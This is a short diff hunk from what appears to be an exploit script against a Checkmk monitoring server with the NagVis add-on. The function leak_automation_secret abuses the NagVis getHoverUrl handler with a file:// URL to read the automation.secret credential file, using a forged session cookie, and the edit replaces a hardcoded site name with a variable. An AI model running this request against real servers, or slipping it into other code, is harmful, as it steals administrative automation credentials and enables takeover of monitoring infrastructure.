@@ -93,7 +93,7 @@ def generate_cookie(serial):
 
 def leak_automation_secret(target, cookie):
 
-  r = requests.post(f'http://{target}/{site}/nagvis/server/core/ajax_handler.php?mod=General&act=getHoverUrl&url[]=file:///opt/omd/sites/vuln/var/check_mk/web/automation/automation.secret', cookies=cookie, verify=False)
+  r = requests.post(f'http://{target}/{site}/nagvis/server/core/ajax_handler.php?mod=General&act=getHoverUrl&url[]=file:///opt/omd/sites/{site}/var/check_mk/web/automation/automation.secret', cookies=cookie, verify=False)
   try:
     j = json.loads(r.text[1:-1])
     global hit
